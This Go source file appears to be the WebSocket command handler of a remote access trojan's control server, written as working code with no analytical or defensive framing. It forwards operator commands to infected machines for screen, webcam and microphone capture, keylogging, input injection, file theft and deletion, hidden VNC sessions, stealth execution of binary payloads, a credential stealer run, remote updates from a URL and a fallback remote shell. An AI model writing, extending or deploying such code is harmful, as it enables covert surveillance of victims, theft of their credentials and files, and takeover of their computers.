package handlers

import (
	"fmt"
	"net/http"
	"strings"
	"sync"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// Support multiple UI clients per AgentID
var UIClients = make(map[string][]*websocket.Conn)
var GlobalClients = []*websocket.Conn{} // Dashboard clients
var UIMutex = &sync.Mutex{}

// Constants are defined in agent_handler.go

func WSHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["id"]

	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

    // Check if this is a global dashboard connection
    if agentID == "global" {
        UIMutex.Lock()
        GlobalClients = append(GlobalClients, ws)
        UIMutex.Unlock()
        
        // Keep connection alive for global events
        for {
            if _, _, err := ws.ReadMessage(); err != nil { break }
        }
        
        // Cleanup
        UIMutex.Lock()
        for i, client := range GlobalClients {
            if client == ws {
                GlobalClients = append(GlobalClients[:i], GlobalClients[i+1:]...)
                break
            }
        }
        UIMutex.Unlock()
        return
    }

	UIMutex.Lock()
	UIClients[agentID] = append(UIClients[agentID], ws)
	UIMutex.Unlock()

	// Ensure cleanup happens when this handler exits (connection closes)
	defer func() {
		ws.Close()
		UIMutex.Lock()
		clients := UIClients[agentID]
		for i, client := range clients {
			if client == ws {
				// Remove this connection from the slice
				UIClients[agentID] = append(clients[:i], clients[i+1:]...)
				break
			}
		}
		if len(UIClients[agentID]) == 0 {
			delete(UIClients, agentID)
		}
		UIMutex.Unlock()
	}()

	for {
		_, msg, err := ws.ReadMessage()
		if err != nil {
			break
		}

		command := string(msg)
		if command == "__START_SCREEN__" {
			SendControlPacket(agentID, TYPE_SCREEN_START)
		} else if command == "__STOP_SCREEN__" {
			SendControlPacket(agentID, TYPE_SCREEN_STOP)
		} else if strings.HasPrefix(command, "__START_AUDIO_MIC__") {
			// Handle both exact match and parameterized command
			if strings.Contains(command, ":") {
				// With Device ID
				data := strings.TrimPrefix(command, "__START_AUDIO_MIC__:")
				SendCommandToAgentWithType(agentID, []byte(data), TYPE_AUDIO_MIC_START)
			} else {
				// Default
				SendControlPacket(agentID, TYPE_AUDIO_MIC_START)
			}
		} else if strings.HasPrefix(command, "__START_AUDIO_SYS__") {
			if strings.Contains(command, ":") {
				data := strings.TrimPrefix(command, "__START_AUDIO_SYS__:")
				SendCommandToAgentWithType(agentID, []byte(data), TYPE_AUDIO_SYS_START)
			} else {
				SendControlPacket(agentID, TYPE_AUDIO_SYS_START)
			}
		} else if command == "__STOP_AUDIO_MIC__" {
			SendControlPacket(agentID, TYPE_AUDIO_MIC_STOP)
		} else if command == "__STOP_AUDIO_SYS__" {
			SendControlPacket(agentID, TYPE_AUDIO_SYS_STOP)
		} else if command == "__START_CAM__" {
			SendControlPacket(agentID, TYPE_CAM_START)
		} else if command == "__STOP_CAM__" {
			SendControlPacket(agentID, TYPE_CAM_STOP)
		} else if strings.HasPrefix(command, "__CONFIG__:") {
			configData := strings.TrimPrefix(command, "__CONFIG__:")
			SendCommandToAgentWithType(agentID, []byte(configData), TYPE_SCREEN_CONFIG)
		} else if strings.HasPrefix(command, "__CAM_CONFIG__:") {
			configData := strings.TrimPrefix(command, "__CAM_CONFIG__:")
			SendCommandToAgentWithType(agentID, []byte(configData), TYPE_CAM_CONFIG)
		} else if command == "__KILL__" {
			SendControlPacket(agentID, TYPE_AGENT_KILL)
		} else if command == "__UNINSTALL__" {
			SendControlPacket(agentID, TYPE_AGENT_UNINSTALL)
		} else if command == "__RESTART__" {
			SendControlPacket(agentID, TYPE_AGENT_RESTART)
		} else if strings.HasPrefix(command, "__UPDATE__:") {
			url := strings.TrimPrefix(command, "__UPDATE__:")
			SendCommandToAgentWithType(agentID, []byte(url), TYPE_AGENT_UPDATE)
		} else if strings.HasPrefix(command, "__MOUSE__:") {
			data := strings.TrimPrefix(command, "__MOUSE__:")
			SendCommandToAgentWithType(agentID, []byte(data), TYPE_INPUT_MOUSE)
		} else if strings.HasPrefix(command, "__KEY__:") {
			data := strings.TrimPrefix(command, "__KEY__:")
			SendCommandToAgentWithType(agentID, []byte(data), TYPE_INPUT_KEY)
		} else if strings.HasPrefix(command, "__LS__:") {
			path := strings.TrimPrefix(command, "__LS__:")
			SendCommandToAgentWithType(agentID, []byte(path), TYPE_FILE_LS_REQ)
		} else if strings.HasPrefix(command, "__DL__:") {
			path := strings.TrimPrefix(command, "__DL__:")
			SendCommandToAgentWithType(agentID, []byte(path), TYPE_FILE_DOWN_REQ)
		} else if strings.HasPrefix(command, "__RM__:") {
			path := strings.TrimPrefix(command, "__RM__:")
			SendCommandToAgentWithType(agentID, []byte(path), TYPE_FILE_DELETE)
		} else if strings.HasPrefix(command, "__MKDIR__:") {
			path := strings.TrimPrefix(command, "__MKDIR__:")
			SendCommandToAgentWithType(agentID, []byte(path), TYPE_FILE_MKDIR)
		} else if strings.HasPrefix(command, "__SAVE__:") {
			data := strings.TrimPrefix(command, "__SAVE__:")
			parts := strings.SplitN(data, "|", 2)
			if len(parts) == 2 {
				path := parts[0]
				content := parts[1]
				buf := make([]byte, len(path)+1+len(content))
				copy(buf[0:], []byte(path))
				buf[len(path)] = 0
				copy(buf[len(path)+1:], []byte(content))
				SendCommandToAgentWithType(agentID, buf, TYPE_FILE_UP_REQ)
			}
		} else if command == "__PROC_LS__" {
			SendControlPacket(agentID, TYPE_PROC_LS_REQ)
		} else if strings.HasPrefix(command, "__PROC_KILL__:") {
			pid := strings.TrimPrefix(command, "__PROC_KILL__:")
			SendCommandToAgentWithType(agentID, []byte(pid), TYPE_PROC_KILL)
		} else if command == "__GET_AUDIO_DEVS__" || command == "__LIST_AUDIO_DEVS__" {
			SendControlPacket(agentID, TYPE_AUDIO_DEV_LIST)
		} else if command == "__GET_CAMS__" {
			SendControlPacket(agentID, TYPE_CAM_LIST)
		} else if strings.HasPrefix(command, "__AUDIO_CONFIG__:") {
			data := strings.TrimPrefix(command, "__AUDIO_CONFIG__:")
			SendCommandToAgentWithType(agentID, []byte(data), TYPE_AUDIO_CONFIG)
		} else if command == "__START_KEYLOG__" {
			SendControlPacket(agentID, TYPE_KEYLOG_START)
		} else if command == "__STOP_KEYLOG__" {
			SendControlPacket(agentID, TYPE_KEYLOG_STOP)
		} else if strings.HasPrefix(command, "__OPEN_URL__:") {
			url := strings.TrimPrefix(command, "__OPEN_URL__:")
			SendCommandToAgentWithType(agentID, []byte(url), TYPE_OPEN_URL)
		} else if strings.HasPrefix(command, "__CHAT_INIT__:") {
			name := strings.TrimPrefix(command, "__CHAT_INIT__:")
			SendCommandToAgentWithType(agentID, []byte(name), TYPE_CHAT_INIT)
		} else if strings.HasPrefix(command, "__CHAT_MSG__:") {
			text := strings.TrimPrefix(command, "__CHAT_MSG__:")
			SendCommandToAgentWithType(agentID, []byte(text), TYPE_CHAT_MSG)
		} else if command == "__CHAT_EXIT__" {
			SendControlPacket(agentID, TYPE_CHAT_EXIT)
		} else if strings.HasPrefix(command, "__STEALTH_EXEC__|") {
			// Binary Payload for Stealth Exec
			// Format: __STEALTH_EXEC__|[Binary Data]
			data := msg[len("__STEALTH_EXEC__|"):]
			SendCommandToAgentWithType(agentID, data, TYPE_STEALTH_EXEC)
		} else if command == "__HVNC_START__" {
			SendControlPacket(agentID, TYPE_HVNC_START)
		} else if command == "__HVNC_STOP__" {
			SendControlPacket(agentID, TYPE_HVNC_STOP)
		} else if strings.HasPrefix(command, "__HVNC_EXEC__:") {
			cmd := strings.TrimPrefix(command, "__HVNC_EXEC__:")
			SendCommandToAgentWithType(agentID, []byte(cmd), TYPE_HVNC_EXEC)
		} else if strings.HasPrefix(command, "__HVNC_INPUT__:") {
			data := strings.TrimPrefix(command, "__HVNC_INPUT__:")
			SendCommandToAgentWithType(agentID, []byte(data), TYPE_HVNC_INPUT)
		} else if strings.HasPrefix(command, "__STEALER_EXEC__:") {
			data := strings.TrimPrefix(command, "__STEALER_EXEC__:")
            StealerStatusMutex.Lock()
            StealerStatus[agentID] = "running"
            StealerStatusMutex.Unlock()
            
            // Clear old logs before starting new run
            ClearStealerLogs(agentID)
            
			SendCommandToAgentWithType(agentID, []byte(data), TYPE_STEALER_EXEC)
		} else {
			SendCommandToAgentWithType(agentID, msg, TYPE_SHELL_IN)
		}
	}
}

func BroadcastToUI(agentID string, output string) {
	UIMutex.Lock()
	clients, ok := UIClients[agentID]
	UIMutex.Unlock()
	if ok {
		for _, ws := range clients {
			// Error handling for WriteMessage is tricky in broadcast; we rely on WSHandler loop to clean up bad conns
			ws.WriteMessage(websocket.BinaryMessage, []byte(output))
		}
	}
}

func BroadcastGlobal(msg string) {
    UIMutex.Lock()
    defer UIMutex.Unlock()
    fmt.Printf("[WS] Broadcasting Global: %s to %d clients\n", msg, len(GlobalClients))
    for _, ws := range GlobalClients {
        ws.WriteMessage(websocket.TextMessage, []byte(msg))
    }
}

func BroadcastBinaryToUI(agentID string, data []byte) {
	UIMutex.Lock()
	clients, ok := UIClients[agentID]
	UIMutex.Unlock()
	if ok {
		for _, ws := range clients {
			ws.WriteMessage(websocket.BinaryMessage, data)
		}
	}
}